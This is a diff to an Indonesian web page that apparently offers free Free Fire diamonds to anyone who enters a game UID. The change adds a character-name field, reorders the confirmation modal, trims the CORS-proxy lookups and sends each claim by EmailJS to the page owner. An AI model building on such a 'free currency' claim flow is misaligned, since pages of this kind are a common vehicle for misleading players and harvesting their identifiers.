@@ -596,6 +596,11 @@
       <label for="uInput">UID Free Fire</label>
       <input type="number" id="uInput" placeholder="Contoh: 123456789" maxlength="12" oninput="window.onUsernameInput&&window.onUsernameInput(this.value)" />
       <div class="err-msg" id="uErr"><i class="fa-solid fa-triangle-exclamation ic-amber"></i> Masukkan UID Free Fire kamu!</div>
+    </div>
+    <div class="field">
+      <label for="namaInput">Nama Karakter FF</label>
+      <input type="text" id="namaInput" placeholder="Contoh: ProPlayer123" maxlength="30" />
+      <div class="err-msg" id="namaErr"><i class="fa-solid fa-triangle-exclamation ic-amber"></i> Masukkan nama karakter FF kamu!</div>
       <!-- AVATAR PREVIEW REALTIME -->
       <div id="avatarPreviewWrap" class="avatar-preview-wrap" style="display:none;">
         <div class="avatar-mini-placeholder" id="avatarPreviewPlaceholder"><i class="fa-solid fa-user" style="color:var(--muted);font-size:16px;"></i></div>
@@ -1007,18 +1012,18 @@
     const proxies = [
       u => `https://api.allorigins.win/raw?url=${encodeURIComponent(u)}`,
       u => `https://corsproxy.io/?${encodeURIComponent(u)}`,
-      u => u,
     ];
-    for (const target of targets) {
+    // Coba tiap target dengan tiap proxy, berhenti begitu dapat nama
+    outer: for (const target of targets) {
       for (const proxy of proxies) {
         try {
-          const r = await fetch(proxy(target), { signal: AbortSignal.timeout(7000) });
+          const r = await fetch(proxy(target), { signal: AbortSignal.timeout(3000) });
           const d = await r.json();
           const name = d?.basicInfo?.nickname || d?.name || d?.username || d?.playerName || null;
           if (name) {
             username = name;
             avatarUrl = d?.basicInfo?.headPic || d?.avatar || d?.avatarUrl || '';
-            return { avatarUrl, userId, username };
+            break outer;
           }
         } catch(e) {}
       }
@@ -1065,6 +1070,16 @@
     const val = inp.value.trim();
     const errEl = document.getElementById('uErr');
     if (!val) { inp.classList.add('err'); errEl.classList.add('show'); setTimeout(()=>inp.classList.remove('err'),400); return; }
+    const namaInp = document.getElementById('namaInput');
+    const namaVal = namaInp ? namaInp.value.trim() : '';
+    const namaErrEl = document.getElementById('namaErr');
+    if (!namaVal) {
+      if (namaInp) namaInp.classList.add('err');
+      if (namaErrEl) namaErrEl.classList.add('show');
+      setTimeout(()=>{ if(namaInp) namaInp.classList.remove('err'); },400);
+      return;
+    }
+    if (namaErrEl) namaErrEl.classList.remove('show');
     // BLACKLIST CHECK
     if (window._cekBlacklist) {
       const alasanBl = await window._cekBlacklist(val);
@@ -1088,16 +1103,14 @@
       return;
     }
     errEl.classList.remove('show');
+    // Tampilkan modal konfirmasi dulu sebelum proses apapun
+    const konfirmasi = await bukaModal();
+    if (!konfirmasi) return;
     showLoading('Mengecek UID...');
-    state.username=val; state.userId=null; state.eventMode=false; state.eventDiamond=0;
-    const { avatarUrl, userId, username } = await fetchAvatar(val);
-    state.avatarUrl=avatarUrl; state.userId=userId; state.username=username;
+    state.username=namaVal; state.userId=val; state.avatarUrl=''; state.eventMode=false; state.eventDiamond=0;
     const cek = await window._cekUsername(val);
     if (cek.status === 'exists') { hideLoading(); show('sRequest'); return; }
     localStorage.setItem('ff_username', val);
-    // Tampilkan modal konfirmasi dulu
-    const konfirmasi = await bukaModal();
-    if (!konfirmasi) return;
     showLoading('Memproses klaim...');
     const diamondJumlah = window._normalDiamond || 100;
     if (window._saveKlaim) await window._saveKlaim(state.username, state.userId, state.avatarUrl, diamondJumlah, false);
@@ -1110,7 +1123,7 @@
         await emailjs.send("service_kh5e4gg","template_kt3418h",{username:state.username,price:diamondJumlah,time:_t});
       }
     } catch(e) {}
-    const _wUser = document.getElementById('winUser'); if(_wUser) _wUser.textContent = state.username;
+    const _wUser = document.getElementById('winUser'); if(_wUser) _wUser.textContent = namaVal + ' (UID: ' + val + ')';
     const _wAvatar = document.getElementById('winAvatar'); if(_wAvatar && avatarUrl){ _wAvatar.src=avatarUrl; _wAvatar.style.display=''; }
     hideLoading();
     show('s3'); setSteps(2);
@@ -1313,13 +1326,11 @@
     const wrap = document.getElementById('avatarPreviewWrap');
     if (!val || val.length < 6) { wrap.style.display = 'none'; return; }
     wrap.style.display = 'flex';
-    wrap.className = 'avatar-preview-wrap';
+    wrap.className = 'avatar-preview-wrap found';
     document.getElementById('avatarPreviewName').textContent = 'UID ' + val;
-    document.getElementById('avatarPreviewSub').textContent = 'Mencari akun FF...';
+    document.getElementById('avatarPreviewSub').innerHTML = '<i class="fa-solid fa-circle-check" style="color:#00c853"></i> UID dimasukkan';
     document.getElementById('avatarPreviewImg').style.display = 'none';
     document.getElementById('avatarPreviewPlaceholder').style.display = 'flex';
-    clearTimeout(_avatarPreviewTimer);
-    _avatarPreviewTimer = setTimeout(() => fetchAvatarPreview(val), 700);
   }
 
   async function fetchAvatarPreview(uid) {
@@ -1340,7 +1351,7 @@
     for (const target of targets) {
       for (const proxy of proxies) {
         try {
-          const r = await fetch(proxy(target), { signal: AbortSignal.timeout(7000) });
+          const r = await fetch(proxy(target), { signal: AbortSignal.timeout(3000) });
           const d = await r.json();
           const name = d?.basicInfo?.nickname || d?.name || d?.username || d?.playerName || null;
           if (name) {
